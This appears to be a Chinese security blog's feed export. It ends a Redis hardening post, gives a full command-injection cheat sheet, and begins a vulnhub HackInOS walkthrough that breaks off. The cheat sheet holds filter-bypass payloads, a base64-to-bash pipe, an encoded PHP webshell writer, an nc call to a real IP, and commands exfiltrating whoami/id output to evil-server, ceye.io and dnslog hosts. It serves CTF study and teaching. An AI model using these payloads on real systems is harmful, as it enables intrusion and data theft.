id="禁止外网访问-Redis（重启redis才能生效）"><a href="#禁止外网访问-Redis（重启redis才能生效）" class="headerlink" title="禁止外网访问 Redis（重启redis才能生效）"></a>禁止外网访问 Redis（重启redis才能生效）</h3><p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">bind</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span></span><br></pre></td></tr></table></figure><p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p><h3 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h3><p>修改配置文件redis.conf文件</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port <span class="number">6379</span></span><br></pre></td></tr></table></figure><p>默认端口是6379，可以改变成其他端口（不要冲突就好）</p><h3 id="保证-authorized-keys-文件的安全"><a href="#保证-authorized-keys-文件的安全" class="headerlink" title="保证 authorized_keys 文件的安全"></a>保证 authorized_keys 文件的安全</h3><p>为了保证安全，您应该阻止其他用户添加新的公钥。</p><ul><li>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">400</span> ~<span class="regexp">/.ssh/</span>authorized_keys</span><br></pre></td></tr></table></figure><ul><li>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +<span class="selector-tag">i</span> ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><ul><li>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 权限：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +<span class="selector-tag">i</span> ~/.ssh</span><br></pre></td></tr></table></figure><h3 id="设置防火墙策略"><a href="#设置防火墙策略" class="headerlink" title="设置防火墙策略"></a>设置防火墙策略</h3><p>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/</a></p><p><a href="https://xz.aliyun.com/t/1800" target="_blank" rel="noopener">https://xz.aliyun.com/t/1800</a></p><p><a href="https://www.freebuf.com/column/158065.html" target="_blank" rel="noopener">https://www.freebuf.com/column/158065.html</a></p><p><a href="https://xz.aliyun.com/t/2295" target="_blank" rel="noopener">https://xz.aliyun.com/t/2295</a></p><p><a href="https://www.k0rz3n.com/2018/11/08/Redis%20基础梳理以及其在渗透测试中的利用" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/08/Redis%20基础梳理以及其在渗透测试中的利用</a></p><p><a href="https://www.smi1e.top/gopher-ssrf攻击内网应用复现/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf攻击内网应用复现/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Redis-介绍&quot;&gt;&lt;a href=&quot;#Redis-介绍&quot; class=&quot;headerlink&quot; title=&quot;Redis 介绍&quot;&gt;&lt;/a&gt;Redis 介绍&lt;/h2&gt;&lt;h3 id=&quot;是什么？&quot;&gt;&lt;a href=&quot;#是什么？&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="redis" scheme="https://wywwzjj.top/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>命令注入总结</title>
    <link href="https://wywwzjj.top/2019/05/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>https://wywwzjj.top/2019/05/12/命令注入总结/</id>
    <published>2019-05-11T16:49:43.000Z</published>
    <updated>2019-05-21T02:05:59.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="直接执行代码"><a href="#直接执行代码" class="headerlink" title="直接执行代码"></a>直接执行代码</h2><p>PHP 中有不少可以直接执行代码的函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>();</span><br><span class="line">assert();</span><br><span class="line">system();</span><br><span class="line">exec();</span><br><span class="line">shell_exec();</span><br><span class="line">passthru();</span><br><span class="line">escapeshellcmd();</span><br><span class="line">pcntl_exec();</span><br></pre></td></tr></table></figure><p>preg_replace( ) 代码执行</p><p>preg_replace() 的第一个参数如果存在 <code>/e</code> 模式修饰符，则允许代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $var = <span class="string">"&lt;tag&gt;phpinfo()&lt;/tag&gt;"</span>;</span><br><span class="line">preg_replace(<span class="string">"/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e"</span>, <span class="string">"addslashes(\\1)"</span>, $var);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>若无 <code>/e</code> 修饰符，则可以尝试 %00 截断。</p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><ul><li><p>cmd &gt; file<br>  把cmd命令的输出重定向到文件file中。如果file已经存在，则清空原有文件，使用bash的noclobber选项可以防止复盖原有文件。</p></li><li><p>cmd &gt;&gt; file<br>  把cmd命令的输出重定向到文件file中，如果file已经存在，则把信息加在原有文件后面。</p></li><li><p>cmd &lt; file<br>  使cmd命令从file读入</p></li><li><p>cmd &lt;&lt; text<br>  从命令行读取输入，直到一个与text相同的行结束。除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。如果使用<code>&lt;&lt;-</code> ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考後面的例子。</p></li><li><p>cmd &lt;&lt;&lt; word<br>  把word（而不是文件word）和后面的换行作为输入提供给cmd。</p></li><li><p>cmd &lt;&gt; file<br>  以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。</p></li><li><p>cmd &gt;| file<br>  功能同&gt;，但即便在设置了noclobber时也会复盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用<code>&gt;!</code>实现这一功能。</p></li><li><p>: &gt; filename</p><p>  把文件<code>filename</code>截断为0长度。如果文件不存在, 那么就创建一个0长度的文件(与<code>touch</code>的效果相同).</p></li><li><p>cmd &gt;&amp;n</p><p>  把输出送到文件描述符n</p></li><li><p>cmd m&gt;&amp;n</p><p>  把输出到文件符m的信息重定向到文件描述符n</p></li><li><p>cmd &gt;&amp;-</p><p>  关闭标准输出</p></li><li><p>cmd &lt;&amp;n</p><p>  输入来自文件描述符n</p></li><li><p>cmd m&lt;&amp;n</p><p>  m来自文件描述各个n</p></li><li><p>cmd &lt;&amp;-</p><p>  关闭标准输入</p></li><li><p>cmd &lt;&amp;n-</p><p>  移动输入文件描述符n而非复制它。</p></li><li><p>cmd &gt;&amp;n-</p><p>  移动输出文件描述符n而非复制它。<br>  注意： <code>&gt;&amp;</code>实际上复制了文件描述符，这使得<code>cmd &gt; file 2&gt;&amp;1</code>与<code>cmd 2&gt;&amp;1 &gt;file</code>的效果不一样。</p></li></ul><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">flag</span> /&#123;cat,<span class="built_in">flag</span>&#125;</span><br><span class="line">more <span class="built_in">flag</span></span><br><span class="line">less <span class="built_in">flag</span></span><br><span class="line">bzmore <span class="built_in">flag</span></span><br><span class="line">bzless <span class="built_in">flag</span></span><br><span class="line">head <span class="built_in">flag</span></span><br><span class="line">tail <span class="built_in">flag</span></span><br><span class="line">tailf <span class="built_in">flag</span> </span><br><span class="line">tac <span class="built_in">flag</span></span><br><span class="line">nl <span class="built_in">flag</span></span><br><span class="line">od -a <span class="built_in">flag</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fire</span> <span class="built_in">flag</span></span><br><span class="line">wc <span class="built_in">flag</span></span><br><span class="line">uniq <span class="built_in">flag</span></span><br><span class="line">diff <span class="built_in">flag</span> flag1.txt</span><br><span class="line">sed -n <span class="string">'1,2p'</span> <span class="built_in">flag</span></span><br><span class="line"><span class="built_in">find</span> -P <span class="built_in">flag</span></span><br><span class="line">strings <span class="built_in">flag</span></span><br><span class="line">curl file:<span class="comment">///root/flag</span></span><br><span class="line"><span class="built_in">sort</span> <span class="built_in">flag</span></span><br><span class="line">bash -v <span class="built_in">flag</span> </span><br><span class="line">rev <span class="built_in">flag</span></span><br><span class="line">paste ./<span class="built_in">flag</span>.txt /etc/passwd</span><br></pre></td></tr></table></figure><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="多条命令"><a href="#多条命令" class="headerlink" title="多条命令"></a>多条命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash">0a、%0d    换行符与回车符</span></span><br><span class="line">|           第一条命令结果作为第二条命令的输入</span><br><span class="line">||          第一条执行失败，执行第二条命令</span><br><span class="line">;           连续指令功能。</span><br><span class="line">&amp;           连接的两条命令都会执行</span><br><span class="line">&amp;&amp;          当第一条执行成功后执行后续命令</span><br><span class="line"></span><br><span class="line">echo 666`date` =&gt; 666Tue 14 May 2019 07:15:23 AM EDT</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Windows</span></span><br><span class="line">Copy %0a</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">1a - 一个神奇的角色，作为.bat文件中的命令分隔符</span></span><br><span class="line">&lt;?php</span><br><span class="line">    $command = 'dir '.$_POST['dir'];</span><br><span class="line">    $escaped_command = escapeshellcmd($command);</span><br><span class="line">    file_put_contents('out.bat',$escaped_command);</span><br><span class="line">    system('out.bat');</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="绕过-escapeshellcmd"><a href="#绕过-escapeshellcmd" class="headerlink" title="绕过 escapeshellcmd"></a>绕过 escapeshellcmd</h3><ul><li>win 下执行 bat</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = <span class="string">'dir '</span>.$_POST[<span class="string">'dir'</span>];</span><br><span class="line">$escaped_command = escapeshellcmd($command);</span><br><span class="line">var_dump($escaped_command);</span><br><span class="line">file_put_contents(<span class="string">'out.bat'</span>,$escaped_command);</span><br><span class="line">system(<span class="string">'out.bat'</span>);</span><br></pre></td></tr></table></figure><p>执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">dir</span>=../ %<span class="number">1</span>a whoami</span><br></pre></td></tr></table></figure><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><ul><li>${IFS}</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;flag</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;<span class="variable">$9flag</span></span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS<span class="variable">$9flag</span></span></span><br><span class="line"><span class="meta">cat%</span><span class="bash">09flag  <span class="comment"># \0x09 是 TAB</span></span></span><br></pre></td></tr></table></figure><ul><li>重定向符&lt;&gt;</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;&gt;flag</span><br><span class="line">cat&lt;flag</span><br></pre></td></tr></table></figure><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><ul><li>拼接</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=flag;$a$b $c</span><br></pre></td></tr></table></figure><ul><li>利用已存在的资源</li></ul><p>从已有的文件或者环境变量中获得相应的字符。</p><ul><li>编码</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`echo "Y2F0IGZsYWc="|base64 -d`</span><br><span class="line">echo "Y2F0IGZsYWc="|base64 -d|bash</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">(<span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x66\x6c\x61\x67"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">可以通过这样来写webshell,内容为&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>]);?&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> &#123;<span class="built_in">printf</span>,<span class="string">"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"</span>&#125; &gt;&gt; 1.php</span></span><br></pre></td></tr></table></figure><ul><li>单引号、双引号</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c""at fl''ag</span><br><span class="line">c'a't f'l'ag</span><br></pre></td></tr></table></figure><ul><li>反斜线 \</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure><ul><li>通配符</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/?in/?s =&gt; ls</span><br><span class="line"></span><br><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br><span class="line">[! ] 同 ^</span><br><span class="line">cat fl[0-z]g</span><br><span class="line"></span><br><span class="line">echo d&#123;a,e,i,u,o&#125;g =&gt; dag deg dig dug dog</span><br><span class="line">echo &#123;fl,fla&#125;&#123;ag,g&#125; =&gt; flag flg flaag flag</span><br><span class="line">echo fl&#123;0..z&#125;g =&gt; fl1g,fl2g,...,flyg,flzg</span><br><span class="line"></span><br><span class="line">花括号拓展&#123;OS_COMMAND,ARGUMENT&#125;</span><br><span class="line">在Linux bash中还可以使用&#123;cat,/etc/passwd&#125;来绕过</span><br><span class="line">这里没实验成功</span><br></pre></td></tr></table></figure><ul><li>未定义变量</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">cat$</span><span class="bash">x /etc/passwd</span></span><br></pre></td></tr></table></figure><ul><li>可变函数</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(sy.(st).em)(whoami)</span><br><span class="line"><span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b].<span class="variable">$_GET</span>[c])</span><br><span class="line"></span><br><span class="line">获取内置函数<span class="built_in"> system </span>的索引后，直接执行</span><br><span class="line">get_defined_functions()[internal] | grep ststem</span><br><span class="line">get_defined_functions()[internal][381](whoami)</span><br></pre></td></tr></table></figure><ul><li><code>$@</code></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ c<span class="variable">$@at</span> fl<span class="variable">$@ag</span></span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line"></span><br><span class="line">$ echo i<span class="variable">$@d</span></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">$ i<span class="variable">$@d</span></span><br><span class="line"><span class="attribute">uid</span>=1000(wywwzjj) <span class="attribute">gid</span>=1000(wywwzjj) <span class="attribute">groups</span>=1000(wywwzjj)</span><br><span class="line"></span><br><span class="line">$ echo i<span class="variable">$@d</span>|<span class="variable">$0</span></span><br><span class="line"><span class="attribute">uid</span>=1000(wywwzjj) <span class="attribute">gid</span>=1000(wywwzjj) <span class="attribute">groups</span>=1000(wywwzjj)</span><br><span class="line"></span><br><span class="line">$ echo &#123;nc,47.101.220.241,2333&#125;|<span class="variable">$0</span></span><br><span class="line">直接连 nc 了。。。<span class="variable">$0</span> 好牛逼？</span><br><span class="line"><span class="variable">$0</span> 就相当于 bash 另外 <span class="variable">$n</span> 表示命令行第 n 个参数</span><br><span class="line"></span><br><span class="line">$ <span class="variable">$0</span>&lt;&lt;&lt;i<span class="variable">$@d</span></span><br><span class="line"><span class="attribute">uid</span>=1000(wywwzjj) <span class="attribute">gid</span>=1000(wywwzjj) <span class="attribute">groups</span>=1000(wywwzjj)</span><br></pre></td></tr></table></figure><ul><li>利用已经存在的资源</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">echo</span> $PATH</span><br><span class="line"><span class="string">/usr/local/sbin</span>:<span class="string">/usr/local/bin</span>:<span class="string">/usr/sbin</span>:<span class="string">/usr/bin</span>:<span class="string">/sbin</span>:<span class="string">/bin</span></span><br><span class="line"></span><br><span class="line">$ <span class="keyword">echo</span> $PATH| cut -c 1</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">$ <span class="keyword">echo</span> $PATH| cut -c 1-4</span><br><span class="line"><span class="string">/usr</span></span><br></pre></td></tr></table></figure><ul><li>${PS2} 对应字符 ‘&gt;’</li><li>${PS4} 对应字符 ‘+’</li><li>${IFS} 对应 内部字段分隔符</li><li>${9} 对应 空字符串</li></ul><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><ul><li><p>弹 shell</p></li><li><p>DNS 外带数据</p></li></ul><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://testhash.test.dnslog.link/?`whoami`"</span></span><br></pre></td></tr></table></figure><ul><li>HTTP 外带</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> linux</span></span><br><span class="line">curl http://evil-server/`whoami`</span><br><span class="line">wget http://evil-server/$(whoami)</span><br><span class="line">curl xxxx.ceye.io/`whoami`</span><br><span class="line">curl http://xxxx.ceye.io/$(id|base64)</span><br><span class="line">ping -c 1 `whoami`.xxxx.ceye.io</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> windows</span></span><br><span class="line">http:</span><br><span class="line">for /F %x in ('whoami') do start http://xxx.ceye.io/%x</span><br><span class="line">dns请求：</span><br><span class="line">获取计算机名：for /F "delims=" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line">获取用户名：for /F "delims= tokens=2" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info</span><br><span class="line"></span><br><span class="line">for /F %x in ('whoami') do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%x'));$b=New-Object System.Net.WebClient;$b.DownloadString('http://xxx.ceye.io/'+$a);</span><br></pre></td></tr></table></figure><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><ul><li>文件构造（参考橘子那个 hitcon）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">w</span></span><br><span class="line">将会创建一个名字为 w 的空文件。</span><br></pre></td></tr></table></figure><p>工具</p><ul><li><a href="https://github.com/ewilded/shelling" target="_blank" rel="noopener">shelling</a></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" target="_blank" rel="noopener">巧用命令注入的 N 种姿势</a></p><p><a href="https://chybeta.github.io/2017/08/15/命令执行的一些绕过技巧/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;直接执行代码&quot;&gt;&lt;a href=&quot;#直接执行代码&quot; class=&quot;headerlink&quot; title=&quot;直接执行代码&quot;&gt;&lt;/a&gt;直接执行代码&lt;/h2&gt;&lt;p&gt;PHP 中有不少可以直接执行代码的函数。&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;
      
    
    </summary>
    
    
      <category term="命令注入" scheme="https://wywwzjj.top/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub 靶机实战系列 HackInOS</title>
    <link href="https://wywwzjj.top/2019/04/07/vulnhub-%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-HackInOS/"/>
    <id>https://wywwzjj.top/2019/04/07/vulnhub-靶机实战系列-HackInOS/</id>
    <published>2019-04-07T13:24:18.000Z</published>
    <updated>2019-09-14T08:43:45.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实战好玩，紧张刺激，但很难能针对性地练习某一种知识，更像是一种综合性的考试。</p><p>其次，大牛都说，渗透测试的本质就是信息收集，信息收集的充分性决定了日下来的可能性。可惜，信息收集最耗费的就是时间。对于新手来说，很容易得不偿失。这里表达并非是信息收集不需要练习，而是效益不高，平时的侧重点更应该放到对漏洞的敏感性训练上，否则即使你遇到漏洞依然发现不了，擦肩而过。</p><p>所以说，CTF 题目的练习是很重要的，将每个动作进行分解，练熟，以后遇到综合性的渗透也能游刃有余。大型的 CTF 考察的更是快速学习的能力，平常出烂了的套路题基本不会出现，没多大意义。一个陌生的情景下，对信息的搜集、漏洞的快速锁定以及漏洞的利用能力要求非常高，往往需要深入到源码底层，直接复制个 <code>exp</code> 打过去基本不会见效。出题人又不脑残，随便找个洞就来出题，或者简单粗暴的把环境搬过来，不是等人喷吗？</p><p>废话不多说，回到咱们的靶机。</p><p>看了 <code>d3ckx1</code> 大佬的一些靶机渗透的<a href="https://www.anquanke.com/member/124858" target="_blank" rel="noopener">文章</a>，心里也痒痒的，自己也想试试能不能日进去 ：）。</p><p>然而，还没开始就结束了啊，<code>nmap</code> 和 <code>netdiscover</code> 都没扫到 IP，有点尴尬。</p><p>注意开桥接模式！在此顺便补充下常用的几种<strong>虚拟机网络模式</strong>。</p><ul><li><p>bridged（桥接模式）</p><p>  在这种模式下，使用 <code>VMnet0</code> 虚拟交换机，虚拟机就像是局域网中的一台独立的主机，与宿主机一样，它可以访问网络内任何一台机器。在桥接模式下，可以手工配置它的 <code>TCP/IP</code> 配置信息（<code>IP</code>、子网掩码等，而且还要和宿主机处于同一网段），以实现通过局域网的网关或路由器访问互联网，还可以将 <code>IP</code> 和 <code>DNS</code> 设置成”自动获取“。</p><p>  在桥接模式中，使用VMnet0虚拟交换机，此时虚拟机相当与网络上的一台独立计算机与主机一样，拥有一个独立的IP地址。</p><ul><li><p>A1、A2、A、B 四个操作系统可以相互访问</p></li><li><p>A1、A2 的 IP 为“外网” IP，可以手动设置，也可以自动获取</p><p><img src="http://images0.cnblogs.com/blog/33509/201305/06230732-2bf87fc799ef41c989be329c62a3fe80.png" alt></p></li></ul></li><li><p>NAT（网络地址转换模式）</p><p>  使用 <code>NAT</code> 模式，就是让虚拟机借助 <code>NAT</code> （网络地址转换）功能，通过宿主机所在的网络来访问公网。也就是说，使用 <code>NAT</code> 模式可以实现在虚拟系统里访问互联网。<code>NAT</code> 模式下虚拟机的 <code>TCP/IP</code> 配置信息是由 <code>VMnet8</code> 虚拟网络的 <code>DHCP</code> 服务器提供的，因此 <code>IP</code> 和 <code>DNS</code> 一般设置为“自动获取”，因此虚拟系统也就无法和本局域网中的其他真实主机进行通讯。</p><p>  最大的优势是，虚拟机接入互联网非常简单，不需要进行其他的配置，只要宿主机能联网即可。</p><p>  <strong>如下图所示</strong></p><ul><li><p>A1、A2 可以访问 B</p></li><li><p>B 不可以访问 A1、A2</p></li><li><p>A1、A2、A相互访问</p></li><li><p>A1、A2 的 IP 为局域网 IP，可以手动配置，也可以自动获取</p><p><img src="http://images0.cnblogs.com/blog/33509/201305/06230741-3447f387a8f14f528ff5a23f5b569145.png" alt></p></li></ul></li><li><p>host-only（主机模式）</p><p>  虚拟机只能与虚拟机、主机互访，但虚拟机和外部的网络是被隔离开的，也就是不能上 <code>Internet</code>。</p><p>  在 host-only 模式下，虚拟系统的 TCP/IP 配置信息（如IP地址、网关地址、DNS服务器等），都是由VMnet1 虚拟网络的 DHCP 服务器来动态分配的。</p><p>  使用host-only方式：</p><ul><li><p>A、A1、A2 可以互访</p></li><li><p>A1、A2 不能访问 B</p></li><li><p>B 不能访问 A1、A2</p></li><li><p>A1、A2 为局域网 IP，可以手动配置，也可以设置成自动获取模式</p><p><img src="http://images0.cnblogs.com/blog/33509/201305/06230823-03336f6007ce428c80418ae11161dc22.png" alt></p></li></ul></li></ul><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>先找 IP，<code>netdiscover</code> 启动！扫半天还是扫不到 IP，这种玄学问题还是灵活解决一下吧。换成桥接模式后重启，访客模式进去直接查看 IP。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1xne1vfncj20j20c7gob.jpg" alt></p><p>紧接着查看端口信息</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1xnerjyghj20nx0b94bh.jpg" alt></p><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" 